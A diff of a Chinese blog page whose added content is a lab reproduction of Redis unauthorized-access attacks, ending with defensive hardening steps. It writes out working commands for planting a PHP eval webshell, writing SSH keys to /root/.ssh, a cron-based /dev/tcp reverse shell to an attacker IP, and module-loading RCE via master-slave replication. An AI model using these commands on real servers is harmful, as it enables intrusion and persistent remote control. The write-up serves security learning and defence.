@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
   
-  <title itemprop="name">archive_a: 2023/5 | baicany</title>
+  <title itemprop="name">redis未授权访问漏洞复现 | baicany</title>
   
     <link rel="shortcut icon" href="favicon.ico">
   
@@ -220,146 +220,334 @@
   </div>
 </header>
 
-      <div class="blank" style="padding-top: 75px;">
-</div>
-<div id="content" class="site-content">
-  <div id="main">
-    <header class="page-header">
-      <h1 class="cat-title">
-      归档</h1>
-      <span class="cat-des">
-        <p>
-        Archives</p>
-      </span>
+      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+<div class="pattern-center-blank"></div>
+
+  <div class="pattern-center single-center">
+    <!-- 有配图默认渲染第一张 -->
+    <div class="pattern-attachment-img lazyload" style="background-image: url(https://baicany.github.io/images/s2.png);" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/s2.png">
+    </div>
+    <header class="pattern-header single-header">
+      <h1 class="entry-title">
+      redis未授权访问漏洞复现</h1>
+      <p class="entry-census">
+        <span>
+          <a href="">
+            <img src="https://baicany.github.io/images/head.jpg">
+          </a>
+        </span>
+        <span>
+          <a href="">baicany</a>
+        </span>
+        <span class="bull">
+        ·</span>
+        2023-5-11<span class="bull">
+        ·</span>
+      <span id="busuanzi_value_page_pv"></span>次阅读</p>
     </header>
-    <div id="main-part">
-      <article class="art">
-        <div class="art-main">
-          <div class="art-content">
-            <div id="archives">
-              <p style="text-align:right;">
-                [<span id="al_expand_collapse" style="cursor: s-resize;">
-                全部展开/收缩</span>
-              ]</p>
-              
-              
-              
-              
-              
-                
-                <h3 class="al_year">2023年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      06月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2023/06/03/python_debug_pin/">
-                          <span style="color:#0bf;">
-                          03日20:16:01</span>
-                          flask_debug_pin
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2023/06/01/java%E5%A4%8D%E4%B9%A0%E9%A2%98/">
-                          <span style="color:#0bf;">
-                          01日22:16:01</span>
-                          java复习题
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      05月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2023/05/11/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%94%BB%E5%87%BB/">
-                          <span style="color:#0bf;">
-                          11日22:16:01</span>
-                          redis未授权访问漏洞复现
-                        </a>
-                      </li>
-                      
-              
-              
-              
-              
-              
-                      <li>
-                        <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/">
-                          <span style="color:#0bf;">
-                          11日22:16:01</span>
-                          这是我的第一篇文章
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
-              
-              
-              
-                
-                <h3 class="al_year">2018年</h3>
-              
-              
-                
-                <ul class="al_mon_list">
-                  <li class="al_li">
-                    <span class="al_mon" style="cursor: s-resize;">
-                      12月(<span id="post-num">
-                      3</span>
-                    篇文章)</span>
-                    <ul class="al_post_list" style="">
-              
-                      <li>
-                        <a href="/2018/12/12/Hexo-Theme-Sakura/">
-                          <span style="color:#0bf;">
-                          12日22:16:01</span>
-                          Hexo-Theme-Sakura
-                        </a>
-                      </li>
-                      
-                    </ul>
-                  </li>
-                </ul>
-              
-              
+  </div>
+
+<div id="content" class="site-content">
+  <div id="primary" class="content-area">
+    <main id="main" class="site-main" role="main">
+      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
+        <div class="toc"></div>
+        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
+        
+        <div class="entry-content">
+          <h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>Redis安装后，默认情况下，会绑定在 <code>0.0.0.0:6379</code>，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis 服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的<code>config</code> 命令，可以进行写文件操作，攻击者可以成功将自己的<code>ssh公钥</code>写入目标服务器的 <code>/root/.ssh</code> 文件夹的<code>authotrized_keys</code>文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p>
+<p>(在redis3.2之后，redis增加了protected-mode，在这个模式下，非绑定IP或者没有配置密码访问时都会报错)</p>
+<p>漏洞的产生条件有以下两点:</p>
+<p>(1)  Redis绑定在0.0.0.0:6379,且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网</p>
+<p>(2)  没有设置密码认证（默认为空）或者弱密码，可以免密码登录redis服务</p>
+<p><strong>漏洞影响版本</strong></p>
+<p>Redis 2.x，3.x，4.x，5.x</p>
+<p><strong>漏洞危害</strong></p>
+<p>(1) 攻击者无需认证访问到内部数据,可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据</p>
+<p>(2) 攻击者可通过eval执行lua代码，或通过数据备份功能往磁盘写入后门文件</p>
+<p>(3) 如果redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录目标服务器 </p>
+<h1 id="攻击复现"><a href="#攻击复现" class="headerlink" title="攻击复现"></a>攻击复现</h1><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p>攻击机: kali 2023.1</p>
+<p>靶机: ubuntu 22.04.2</p>
+<p>靶机安装redis服务器(redis-server)</p>
+<ol>
+<li><p>下载redis-4.0.10</p>
+<p><code>wget http://download.redis.io/releases/redis-4.0.10.tar.gz</code></p>
+</li>
+<li><p>解压，进入源码目录，然后编译(make、make install)</p>
+<pre><code>tar -zxf redis-4.0.10.tar.gz
+cd redis-4.0.10
+make
+make install
+</code></pre>
+<p>我这里make出现了错误,缺少gcc</p>
+<pre><code>cd src &amp;&amp; make all
+make[1]: Entering directory &#39;/home/ubuntu/redis-4.0.11/src&#39;
+    CC adlist.o
+/bin/sh: 1: cc: not found
+Makefile:228: recipe for target &#39;adlist.o&#39; failed
+make[1]: *** [adlist.o] Error 127
+make[1]: Leaving directory &#39;/home/ubuntu/redis-4.0.11/src&#39;
+Makefile:6: recipe for target &#39;all&#39; failed
+make: *** [all] Error 2
+</code></pre>
+<p>apt install gcc</p>
+<pre><code>cd src &amp;&amp; make all
+make[1]: Entering directory &#39;/home/ubuntu/redis-4.0.11/src&#39;
+    CC adlist.o
+In file included from adlist.c:34:0:
+zmalloc.h:50:10: fatal error: jemalloc/jemalloc.h: No such file or directory
+ #include &lt;jemalloc/jemalloc.h&gt;
+          ^~~~~~~~~~~~~~~~~~~~~
+compilation terminated.
+Makefile:228: recipe for target &#39;adlist.o&#39; failed
+make[1]: *** [adlist.o] Error 1
+make[1]: Leaving directory &#39;/home/ubuntu/redis-4.0.11/src&#39;
+</code></pre>
+<p>可以通过 mkae MALLOC=libc</p>
+<p>需要修改配置文件redis.conf</p>
+<pre><code>bind 0.0.0.0
+protected-mode no
+</code></pre>
+</li>
+<li><p>启动服务(redis-server)<br>启动redis服务，注意关闭防火墙，Ubuntu除了iptables机制，还有ufw安全机制</p>
+<p><code>ufw staus</code>看是否关闭<br>启动服务</p>
+<p><img src="https://img2018.cnblogs.com/blog/1592114/201910/1592114-20191012203213483-1785541353.png" alt="img"></p>
+</li>
+</ol>
+<p>kali安装redis</p>
+<ol>
+<li><p>下载redis-4.0.10(跟上面一样)//但是我用的2.8</p>
+</li>
+<li><p>解压,编译(跟什么一样)</p>
+</li>
+<li><p>测试是否能连接<br><img src="https://img2018.cnblogs.com/blog/1592114/201910/1592114-20191012203316598-1153965360.png" alt="img"></p>
+</li>
+</ol>
+<p>​        这里连接后发现输入info报错</p>
+<p><img src="https://baicany.github.io/images/image-20230608110721420.png" alt="image-20230608110721420"></p>
+<p>​    还是因为protected-mode原因在靶机再开一个虚拟终端</p>
+<pre><code>root@ubuntu:/data/redis-4.0.6# ./src/redis-cli
+127.0.0.1:6379&gt; CONFIG SET protected-mode no
+OK
+</code></pre>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>测试目标靶机是否存在未授权访问</p>
+<p><img src="https://baicany.github.io/images/image-20230608112133014.png" alt="image-20230608112133014"></p>
+<h3 id="写入webshell"><a href="#写入webshell" class="headerlink" title="写入webshell"></a>写入webshell</h3><p>利用条件:目标开启了web服务器,并且知道web路径(可以利用phpinfo或者错误暴路径等)，还需要具有读写增删改查权限</p>
+<p><img src="https://img2018.cnblogs.com/blog/1592114/201910/1592114-20191012203436012-1515179378.png" alt="img"></p>
+<pre><code>config get dir 
+config set dir /var/www/html/
+config set dbfilename shell.php
+set shell &quot;\r\n\r\n&lt;?php phpinfo();?&gt;\r\n\r\n&quot;
+save
+</code></pre>
+<p>在写入webshell的时候，可以使用：<code>\r\n</code>来换行，有些redis版本写文件会自带一些版本文件，可能导致无法解析。</p>
+<p>当数据库过大时，redis写shell：</p>
+<pre><code class="php">&lt;?php 
+set_time_limit(0);
+$fp=fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);
+fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);
+exit();
+?&gt;
+</code></pre>
+<p>看到靶机是否写入文件</p>
+<h3 id="写入ssh公钥"><a href="#写入ssh公钥" class="headerlink" title="写入ssh公钥"></a>写入ssh公钥</h3><p>SSH提供两种登录验证方式：一种是口令验证也就是账号密码登录，另一种是密钥验证，这里只简单说一下密钥验证的原理。</p>
+<p>所谓密钥验证，其实就是一种基于公钥密码的认证，使用公钥加密、私钥解密，其中公钥是公开的，放在服务器端，你可以把同一个公钥放在所有你想SSH远程登录的服务器中，而私钥是保密的只有你自己知道，公钥加密的消息只有私钥才能解密，大体过程如下：</p>
+<blockquote>
+<p>（1）客户端生成私钥和公钥，并把公钥拷贝给服务器端；</p>
+<p>（2）客户端发起公钥认证请求，发送自己的相关信息；</p>
+<p>（3）服务器端根据客户端发来的信息查找是否存有该客户端的公钥，若没有拒绝登录；若有则使用该公钥对一个随机的256位的字符串进行加密，并发送给客户端；</p>
+<p>（4）客户端收到服务器发来的加密后的消息后使用私钥解密，并生成一个MD5值发送给服务器端；</p>
+<p>（5）服务器端根据原始随机字符串生成MD5值进行匹配, 确认客户端身份，若一样则允许登录，不一样则拒绝登录。</p>
+</blockquote>
+<p>原理就是在数据库中插入一条数据，将本机的公钥作为value,key值随意，然后通过修改数据库的默认路径为/root/.ssh和默认的缓冲文件authorized.keys,把缓冲的数据保存在文件里，这样就可以在服务器端的/root/.ssh下生一个授权的key。</p>
+<ol>
+<li><p>在攻击机上生成ssh公钥,密码设置为空 为空就是在生成公钥和私钥的过程中回车即可</p>
+<p><img src="https://baicany.github.io/images/image-20230608123359005.png" alt="image-20230608123359005"></p>
+</li>
+<li><p>进入/root/.ssh将公钥写入key.txt文件（前后用\n换行，避免和redis里其他缓存数据混合）。<br><img src="https://baicany.github.io/images/image-20230608123445546.png" alt="image-20230608123445546"></p>
+</li>
+</ol>
+<p>​    (echo -e “\n”;cat id_rsa.pub;echo -e “\n”)&gt;key.txt</p>
+<ol start="3">
+<li><p>再把key.txt文件内容写入redis缓冲</p>
+<p>cat /root/.ssh/key.txt |./redis-cli -h 192.168.10.139 -x set pub</p>
+<p><img src="https://baicany.github.io/images/image-20230608123555517.png" alt="image-20230608123555517"></p>
+</li>
+<li><p>设置redis的dump文件路径为/root/.ssh且文件名为authorized_keys,<br>注意: redis 可以创建文件但无法创建目录，所以，redis 待写入文件所在的目录必须事先存在。出现如下图错误是因为目标靶机不存在.ssh目录(默认没有,需要生成公、私钥或者建立ssh连接时才会生成)<br><strong><img src="https://baicany.github.io/images/image-20230608123815826.png" alt="image-20230608123815826"></strong></p>
+</li>
+</ol>
+<p>注: 在靶机中需要开启ssh服务才行，在靶机中输入systemctl start sshd,开启ssh服务<br>        如果没有就apt install openssh-server就行了</p>
+<ol start="5">
+<li>然后测试是否能连接<br><img src="https://baicany.github.io/images/image-20230608124200078.png" alt="image-20230608124200078"></li>
+</ol>
+<p>出现现在这个界面就进入靶机了,输入命令将是靶机的内容了</p>
+<h3 id="定时任务-反弹shell"><a href="#定时任务-反弹shell" class="headerlink" title="定时任务,反弹shell"></a>定时任务,反弹shell</h3><ol>
+<li><p>在攻击机开启监听<br><code>nc -lnvp 1234</code></p>
+</li>
+<li><p>连接redis服务器，写入反弹shell。</p>
+<pre><code>SET xxx &quot;\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.26.120/1234 0&gt;&amp;1\n\n&quot;
+CONFIG SET dir /var/spool/cron
+CONFIG SET dbfilename root
+save
+</code></pre>
+</li>
+</ol>
+<p>这个复现了很长时间o(╥﹏╥)o,配环境,</p>
+<p>登陆ubuntu查看计划任务，已经成功写入。但是发现计划中存在乱码，也就是这些乱码导致计划任务执行错误。<br>这是由于redis向任务计划文件里写内容出现乱码而导致的语法错误，而乱码是避免不了的，centos会忽略乱码去执行格式正确的任务计划，而ubuntu并不会忽略这些乱码，所以导致命令执行失败，因为自己如果不使用redis写任务计划文件，而是正常向/etc/cron.d目录下写任务计划文件的话，命令是可以正常执行的，所以还是乱码的原因导致命令不能正常执行，而这个问题是不能解决的，因为利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据。</p>
+<p>动把乱码删除，发现依然无法成功反弹shell。这是为什么呢？</p>
+<p>根据网上搜到改后配置后,连接成功</p>
+<h3 id="redis主从复制"><a href="#redis主从复制" class="headerlink" title="redis主从复制"></a>redis主从复制</h3><p>Redis是一个使用ANSI C编写的开源、支持网络、基于内存、可选持久性的键值对存储数据库。但如果当把数据存储在单个Redis的实例中，当读写体量比较大的时候，服务端就很难承受。为了应对这种情况，Redis就提供了主从模式，主从模式就是指使用一个redis实例作为主机(master)，其他实例都作为备份机(slave)，其中主机和从机数据相同，而从机只负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。</p>
+<p>redis模块</p>
+<pre><code>在Reids 4.x之后，Redis新增了模块功能，通过外部拓展，可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。编写恶意so文件的代码
+</code></pre>
+<p>利用原理</p>
+<pre><code>在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载so文件，我们就可以执行拓展的新命令了。很多主从复制导致任意命令执行都是通过Redis的未授权访问漏洞导致了横向移动攻击方式的发生。
+</code></pre>
+<p>复现kali靶机就行:</p>
+<ol>
+<li><p>下载恶意os文件</p>
+<p><code>git clone https://github.com/RicterZ/RedisModules-ExecuteCommand</code></p>
+<p>然后编译源码make,</p>
+</li>
+<li><p>下载工具getshell</p>
+<p><code>git clone https://github.com/Ridter/redis-rce</code></p>
+<p>将第一步的module.so反正攻击目录下</p>
+</li>
+<li><p>第三步直接用脚本<br><code>python redis-rce.py -r 127.0.0.1 -p 6307 -L 127.0.0.1 -f module.so</code><br><img src="C:\Users\qwe\AppData\Roaming\Typora\typora-user-images\image-20230612165455249.png" alt="image-20230612165455249"></p>
+<p>按i进入交互式输入命令就行，重要是理解原理</p>
+<p><strong>Redis主从复制手动挡</strong></p>
+<p>1.使用脚本，监听本地端口1234，加载exp.so。</p>
+<pre><code>python RogueServer.py --lport 1234 --exp exp.so
+</code></pre>
+<p>2、通过未授权访问连入要攻击的redis服务器。</p>
+<p>执行相关命令：</p>
+<pre><code>#设置redis的备份路径为当前目录
+    config set dir ./
+#设置备份文件名为exp.so，默认为dump.rdb
+    config set dbfilename exp.so
+#设置主服务器IP和端口
+    slaveof 192.168.172.129 1234  
+#加载恶意模块
+    module load ./exp.so
+#切断主从，关闭复制功能
+    slaveof no one 
+#执行系统命令
+    system.exec &#39;whoami&#39;
+    system.rev 127.0.0.1 9999    
+#通过dump.rdb文件恢复数据
+    config set dbfilename dump.rdb
+#删除exp.so
+    system.exec &#39;rm ./exp.so&#39;
+#卸载system模块的加载
+    module unload system
+</code></pre>
+</li>
+</ol>
+<h1 id="防御措施"><a href="#防御措施" class="headerlink" title="防御措施"></a>防御措施</h1><ol>
+<li><p>限制ip访问 如修改的配置文件</p>
+</li>
+<li><p>增加远程登录密码</p>
+</li>
+<li><p>禁止远程危险命令</p>
+<pre><code>rename-command FLUSHALL &quot;&quot;
+rename-command CONFIG   &quot;&quot;
+rename-command EVAL     &quot;&quot;
+</code></pre>
+<p>低权限运行Redis服务</p>
+</li>
+</ol>
+<p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
+<pre><code class="text">groupadd -r redis &amp;&amp; useradd -r -g redis redis
+</code></pre>
+<p>保证authorized_keys文件的安全</p>
+<p>阻止其他用户添加新的公钥。将<code>authorized_keys</code>的权限设置为对拥有者只读，其他用户没有任何权限</p>
+
+        </div>
+        <!-- .entry-content -->
+        <div class="single-reward">
+          <div class="reward-open">赏
+            <div class="reward-main">
+              <ul class="reward-row">
+                <li class="alipay-code"><img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/AliPayQR.jpg"></li>
+                <li class="wechat-code"><img src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/custom/donate/WeChanQR.jpg"></li>
+              </ul>
             </div>
           </div>
         </div>
+        <div style="text-align:center; width: 100%" class="social-share share-mobile" data-disabled="diandian, tencent"></div>
+        <footer class="post-footer">
+          <div class="post-lincenses"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="nofollow"><i class="fa fa-creative-commons" aria-hidden="true"></i> 知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议</a></div>
+          <div class="post-tags">
+          </div>
+          <div class="post-share">
+            <div class="social-share sharehidden share-component"></div>
+            <i class="iconfont show-share icon-forward"></i>
+          </div>
+        </footer><!-- .entry-footer -->
       </article>
-    </div>
-  </div>
+      <!-- #post-## -->
+      <div class="toc" style="background: none;"></div>
+      <section class="post-squares nextprev">
+        
+          
+            <div class="post-nepre half previous">
+          
+            <a href="/2023/06/01/java%E5%A4%8D%E4%B9%A0%E9%A2%98/" rel="prev">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/s15.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/s15.png">
+              </div>
+              <span class="label">
+              Previous Post</span>
+              <div class="info">
+                <h3>
+                java复习题</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+        
+          
+            <div class="post-nepre half next">
+          
+            <a href="/2023/05/11/%E7%AC%AC%E4%B8%80%E7%AF%87%E5%8D%9A%E5%AE%A2/" rel="next">
+              <div class="background">
+                <img class="lazyload" src="https://cdn.jsdelivr.net/gh/honjun/cdn@1.6/img/loader/orange.progress-bar-stripe-loader.svg" data-src="https://baicany.github.io/images/s4.png" style="width: 100%; height: 100%; object-fit: cover; pointer-events: none;" onerror="imgError(this,3)" src="https://baicany.github.io/images/s4.png">
+              </div>
+              <span class="label">
+              Next Post</span>
+              <div class="info">
+                <h3>
+                这是我的第一篇文章</h3>
+                <hr>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      
+
+
+
+      <section class="author-profile">
+        <div class="info" itemprop="author" itemscope="" itemtype="https://schema.org/Person">
+          <a href="" class="profile gravatar"><img src="https://baicany.github.io/images/head.jpg" itemprop="image" alt="baicany" height="70" width="70"></a>
+          <div class="meta">
+            <span class="title">Author</span>
+            <h3 itemprop="name">
+            <a href="" itemprop="url" rel="author">baicany</a>
+            </h3>
+          </div>
+        </div>
+        <hr>
+        <p><i class="iconfont icon-write"></i></p>
+      </section>
+    </main><!-- #main -->
+  </div><!-- #primary -->
 </div>
+
+
 
     </div>    
     <div class="ins-search">
